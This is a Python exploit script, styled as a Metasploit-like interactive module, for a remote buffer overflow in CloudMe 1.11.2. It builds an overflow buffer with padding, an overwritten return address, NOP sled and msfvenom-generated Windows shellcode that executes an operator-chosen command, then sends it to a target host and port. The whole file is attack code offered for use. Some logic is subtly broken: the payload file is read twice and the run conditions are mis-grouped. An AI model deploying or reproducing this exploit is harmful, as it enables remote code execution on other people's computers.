import socket
import time
import subprocess


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, server_address, remote_port_number, command):
        self.server_address = server_address
        self.command = command
        self.remote_port = remote_port_number

    def un_encoded_exploit(self, timeout):
        padding1 = b"\x90" * 1052
        EIP = b"\xB5\x42\xA8\x68"
        NOPS = b"\x90" * 30
        null_values = b"\x00\x0A\x0D"
        print(f"{Colors.red}Making Payload...{Colors.end}")
        time.sleep(timeout)
        subprocess.check_output(f"msfvenom -a x86 -p windows/exec CMD={self.command} -b '{null_values}' -f python -o "
                                f"payload", shell=True)
        payload = open("payload", "rb")
        overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload.read()))

        buf = padding1 + EIP + NOPS + payload.read() + overrun

        try:
            print(f"{Colors.red}Sending Payload...{Colors.end}")
            time.sleep(int(timeout))
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.server_address, int(self.remote_port)))
            sock.send(buf)
            print(f"{Colors.red}Exploit Sent Success! Receiving response...{Colors.end}")
            time.sleep(int(timeout))
            payload.close()
            response = sock.recv(1024)
            print(str(response.decode("utf-8")))
            sock.close()
            subprocess.call("rm -f payload", shell=True)
        except socket.error as error:
            subprocess.call("rm -f payload", shell=True)
            exit(error)

    def encoded_exploit(self, sleepy_time):
        padding1 = b"\x90" * 1052
        EIP = b"\xB5\x42\xA8\x68"
        NOPS = b"\x90" * 30
        null_values = b"\x00\x0A\x0D"
        print(f"{Colors.red}Making Payload...{Colors.end}")
        time.sleep(int(sleepy_time))
        subprocess.check_output(f"msfvenom -a x86 -p windows/exec CMD={self.command} -b '{null_values}' -e "
                                f"powershell_base64 -f python -o "
                                f"payload", shell=True)
        payload = open("payload", "rb")
        overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload.read()))

        buf = padding1 + EIP + NOPS + payload.read() + overrun

        try:
            print(f"{Colors.red}Sending Payload...{Colors.end}")
            time.sleep(int(sleepy_time))
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.server_address, int(self.remote_port)))
            sock.send(buf)
            print(f"{Colors.red}Exploit Sent Success! Receiving response...{Colors.end}")
            time.sleep(int(sleepy_time))
            payload.close()
            response = sock.recv(1024)
            print(str(response.decode("utf-8")))
            sock.close()
            subprocess.call("rm -f payload", shell=True)
        except socket.error as error:
            subprocess.call("rm -f payload", shell=True)
            exit(error)


options = \
    """ 
Variables                 Description                         Needed
---------                 -----------                         ------
remote_host               remote ip address (target)           yes
remote_port               remote port number (service)         yes
command                   command to execute                   yes
encode_shellcode          encode the payload                   yes
(example)
    set remote_host 127.0.0.1
    set remote_port 8888
    set command dir
    set encode_shellcode yes / no
    run / exploit
"""


def interaction():
    global remote_port, remote_address, r_command, true_or_false
    while True:
        try:
            module = input(f"{Colors.red}(CloudMe 1.11.2 Remote Buffer Overflow){Colors.end} [MODULE]:~#")
            if module == "help" or module == "options":
                print(options)
            elif module == "back" or module == "exit":
                break

            elif "set remote_host " in module:
                remote_address = module[16:]
                print(f"remote_host: {Colors.red}{remote_address}{Colors.end}")
            elif "set remote_port " in module:
                remote_port = module[16:]
                print(f"remote_port: {Colors.red}{remote_port}{Colors.end}")
            elif "set command " in module:
                r_command = module[12:]
                print(f"command: {Colors.red}{r_command}{Colors.end}")
            elif "set encode_shellcode " in module:
                true_or_false = module[21:]
                print(f"encode_shellcode: {Colors.red}{true_or_false}{Colors.end}")

            elif module == "run" or module == "exploit" and true_or_false == "no" or true_or_false == "No":
                attack = Exploit(remote_port_number=remote_port, server_address=remote_address, command=r_command)
                attack.un_encoded_exploit(timeout=2)
            elif module == "run" or module == "exploit" and true_or_false == "yes" or true_or_false == "Yes":
                attack = Exploit(remote_port_number=remote_port, server_address=remote_address, command=r_command)
                attack.encoded_exploit(sleepy_time=2)
            else:
                continue
        except NameError:
            continue


if __name__ == "__main__":
    try:
        interaction()
    except KeyboardInterrupt:
        print(f"{Colors.red}Keyboard Interruption Occurred{Colors.end}")
